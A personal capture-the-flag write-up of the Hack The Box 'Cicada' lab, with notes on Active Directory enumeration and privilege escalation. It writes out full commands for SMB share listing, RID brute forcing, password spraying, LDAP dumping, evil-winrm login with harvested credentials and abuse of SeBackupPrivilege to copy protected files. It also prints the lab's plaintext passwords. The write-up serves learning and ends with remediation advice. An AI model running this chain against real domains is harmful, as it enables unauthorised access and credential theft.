# Summary

I completed this box on adventure mode.

This was categorized as an AD box but only a very small portion of it had anything to do with Active Directory.

An anonymous SMB share has a Company default password for users. You use RID Brute Forcing to enumerate valid users. Password spray the default password against the valid users and you find that one of the users is still on the default password. This gives you access to credentialed enumeration. Through an SMB based tool or LDAP you will find that one of the users has their password in the description field. This user has access to an SMB share that your first user does not. In that SMB share is a script from another user. She left her creds in the script. She is a member of the Backup Operators and Remote Management group.

The first thing is to use a remote management interface to enter the box and grab the user.txt. Then there are a number of ways to abuse the Backup Operator group membership. I chose to take the cheap way out and copy down the root.txt file for a flag. I was reminded of more proper techniques after I reviewed the video and written walkthroughs.
# Actions

Our story begins, as always, with an Nmap scan

```
sudo nmap -sC -sV 10.10.11.35 -oN cicada.nmap
```

![[Pasted image 20250617110542.png]]

I add the domain and domain controller name to my /etc/hosts
```

echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts
```

Looking at the Nmap results there are 3 services to enumerate:
- SMB
- LDAP
- RPC

I start with SMB as it is the juiciest.
```
smbclient -N -L \\\\cicada.htb
```

![[Pasted image 20250617110701.png]]

I find DEV and HR shares that are non-standard shares.

```
smbclient //cicada.htb/dev
```
![[Pasted image 20250617110819.png]]
```
smbclient //cicada.htb/hr
```
![[Pasted image 20250617110844.png]]

![[Pasted image 20250617111008.png]]

So I find a password but no user. Before doing this box I did not know about "RID Cycling". I spent a lot of time running kerbrute userenum with the jsmith.txt variants.
```
kerbrute userenum -d cicada.htb --dc cicada.htb -o valid_ad_users -v /usr/share/wordlists/statistically-likely-usernames/jsmith.txt
```
These wordlists are available at https://github.com/insidetrust/statistically-likely-usernames

I stepped away and pondered it for awhile. I came up with the idea of checking the SSL certs for emails and names - something I could go off of to generate a username
```
openssl s_client -connect cicada.htb:636 -showcerts
```
I tried a few of the SSL service ports. No dice.

It was at this point that I realized I may be missing a technique. It appears that the CPTS course was thorough but not exhaustive. So I peek at the guide.

And sure enough it points me to a tool called "netexec" that can run a technique called "RID Cycling" or "RID brute-force"
```
netexec smb cicada.htb -u guest -p '' --rid-brute
```
https://www.netexec.wiki/

![[Pasted image 20250617152718.png]]

When I watched Ippsec's video afterwards he did a very good job of explaining how this works. This is a noisier technique than kerbrute's userenum (which leverages the KDC service) but it actually leverages RPC to find users. 

The RID of an object is the last portion of the SID. All objects have a common SID until the last few digits which depict the RID of the object itself. The Administrator user is RID 500. 

RPC has a call called "lookupsids".

![[Pasted image 20250620155223.png]]

If you iterate over the RID with the lookupsids function, you will get back objects. Some of which will be users

![[Pasted image 20250620111059.png]]

So anyways have netexec automate that for you:
```
netexec smb cicada.htb -u guest -p '' --rid-brute
```
https://www.netexec.wiki/

![[Pasted image 20250617152718.png]]

Extract the usernames from that output and password spray:

```shell-session
kerbrute passwordspray -d cicada.htb --dc cicada.htb valid_ad_users 'Cicada$M6Corpb*@Lp#nZp!8'
```
kerbrute failed so I am trying cmb

![[Pasted image 20250619085721.png]]
```
crackmapexec smb cicada.htb -u valid_ad_users -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```
![[Pasted image 20250619085657.png]]

For some reason, kerbrute and cmb did not work. So I tried it one-by-one using cmb until eventually the michael.wrightson user was still on the default password
```
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```
![[Pasted image 20250619090301.png]]

At this point I know that once you had valid creds you run bloodhound.
```
bloodhound-ce -c ALL -d cicada.htb -u michael.wrightson@cicada.htb -p 'Cicada$M6Corpb*@Lp#nZp!8' -ns 10.10.11.35
```
There actually was not a lot in the Bloodhound results. I got thrown for quite a loop when I found this one mystery RID:

![[Pasted image 20250619092447.png]]

From RPC:
```
lookupsids S-1-5-21-917908876-1423158569-3159038727-1107
```
![[Pasted image 20250619093738.png]]

I never figured out what that was about. Since I had yet to enumerate LDAP I went ahead and pulled that info:
```
ldapsearch -H ldap://cicada.htb -x -D "michael.wrightson@cicada.htb" -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb" 
```
Having discovered this new netexec tool I also tried out its SMB spider.
```
netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -M spider_plus -o DOWNLOAD_FLAG=True
```
This only brought down some GPOs. Nothing hidden in there.

When I combed through the LDAP output there was a password in a description field:

![[Pasted image 20250619102320.png]]

So time to re-enumerate as the new user. I figure there is something in that DEV share so I check if this new guy has access.
```
crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```
![[Pasted image 20250619102813.png]]

Indeed he does. I hop in to see:
```
smbclient //cicada.htb/dev -U david.orelious
```
![[Pasted image 20250619102933.png]]

![[Pasted image 20250619102951.png]]

And they just give you creds to another user. Just like that.

I had learned from my bloodhound enumeration that Emily is a remote management and backup operator user.

![[Pasted image 20250619103053.png]]

So I can use evil-winrm
```
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```
![[Pasted image 20250619103410.png]]

That will get you the user.txt.

Next of course was to enumerate and escalate.

Emily is a member of Backup Operators. I check on her local token to see how the SeBackupPrivilege is doing:

![[Pasted image 20250620090714.png]]

It is enabled.

This can be exploited in several ways. Members of the Backup Operators user group have the ability to see all files and folders on AD joined systems. The Backup Operators group grants members the ability to backup and restore data for disaster recovery scenarios - even if they do not have explicit access to read/write that data.

Of course, this can be abused. https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

I found through 0xdf and Ippsecs walkthroughs that conventional wisdom is to grab the SAM and SYSTEM hives (or ntds.dit in place of SAM if this is a DC) and crack them offline. From one view, that is what I should have done. Instead I approached this as all I needed to do was read the root.txt file for the final flag. There is nothing wrong with my approach as every engagement can have different objectives.

So to abuse SeBackupPrivileges there is this 12 year old repo:

https://github.com/giuliano108/SeBackupPrivilege?tab=readme-ov-file

I am not sure if this guy is actually a programmer. To use this tool you need to upload 2 of the DLLs to the target - SeBackupPrivilegeCmdLets.dll and SeBackupPrivilegeUtils.dll. Import them as modules then execute the 3 exported commands the modules provide.

At some point in the past (this repo is 12 years old and has not been touched since) he committed builds to the repo and wants you to download those.

I would not bother with that approach as the build versions do not match and execution presents a conflict:
![[Pasted image 20250620095845.png]]

For some reason the DLLs build to multiple locations in the repo. He also points you to the Debug builds over the Release builds. The links in the README direct you to the dlls in SeBackupPrivilegeCmdLets/bin/Debug.

Here is how to fix this: Clone the repo locally. Import the .sln file into Visual Studio. Run a Build > Clean on the release and debug versions. Then select Build > Debug. This will create new versions of those Debug DLLs. As a note the Debug build will be bulkier and noisier than the release build. Debug builds contain special mappings and symbols so you can hook a debugger in. But I didn't want to spend all day improving this guy's process I just needed that flag.

Note: It is always good practice to build tools yourself before uploading them to a client. Part of this is to verify the authenticity of the code. Take some time to review the code. If this contains a binary level exploit you are probably not going to catch it with a quick glance like this. Verify that the program is not calling other programs outside of the purposes of the tool. Also check to make sure it is not a dropper/beacon - calling out to random web addresses to pull in more malicious executables or code. That can be done relatively quickly and can save a lot of embarrassment.

So I uploaded the versions I build myself. Get-Modules reveals that we  have version match:

![[Pasted image 20250620100604.png]]

This tool exports 3 cmdlets. Get-SeBackupPrivilege tells you if SeBackupPrivilege is set on the current user token and if it is enabled. Set-SeBackupPrivilege will enable the privilege if it is not. Copy-FileSeBackupPrivilege will abuse the privilege to copy a file to a location with an ACE that you can read and write with.
```
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt .\root.txt
```
![[Pasted image 20250620100811.png]]

So copying that file yields the root flag and the box is owned.
# Remediation

Users are going to do things like leave passwords in their files. Also, it is obvious that the Emily Oscars user privileges should be reviewed. I am not saying that she should have her privileges revoked because that is what I abused in my attack, I am advocating that it should be audited to verify that she indeed needs those privileges.

Any level of audit of the Active Directory would have revealed the password left in the description field of the David Orleans user. Bloodhound, PingCastle, or Grouper would assist in identifying weaknesses in IAM and configurations. If it does not get blocked on running, Netexec's --users flag will show users and description fields.

# Lessons from Walkthroughs

Both 0xdf and Ippsec used the SeBackupPrivilege to grab the SAM and SYSTEM hives to exploit for the Administrator hash. They then used a remote management tool to pass the hash as Administrator and grab the flag. Ippsec took the time to demonstrate also grabbing the ntds.dit file and cracking that with impacket.
# Conclusion

Once I learned about RID cycling, this was a very easy box. Essentially it was just a game of follow the white rabbit.